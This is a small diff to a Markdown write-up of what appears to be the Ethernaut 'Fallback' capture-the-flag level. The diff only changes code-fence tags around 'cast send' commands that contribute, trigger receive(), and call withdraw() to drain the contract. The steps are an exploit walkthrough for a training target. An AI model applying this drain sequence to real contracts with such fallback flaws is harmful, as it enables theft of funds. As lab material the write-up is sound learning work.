@@ -65,12 +65,12 @@ cast send $LEVEL_ADDRESS "contribute()" --value 0.0001ether --private-key=$PRIVA
 ```
 
 2. Triggering the fallback function **receive()** by sending an eth transaction with an empty data field
-```
-cast send $LEVEL_ADDRESS --value 0.0001ether --private-key $PRIVATE_KEY
+```bash
+$ cast send $LEVEL_ADDRESS --value 0.0001ether --private-key $PRIVATE_KEY
 ```
 
 3. Draining the contract
-```
+```properties
 cast send $LEVEL_ADDRESS "withdraw()" --private-key $PRIVATE_KEY
 ```
 ## Further Reading
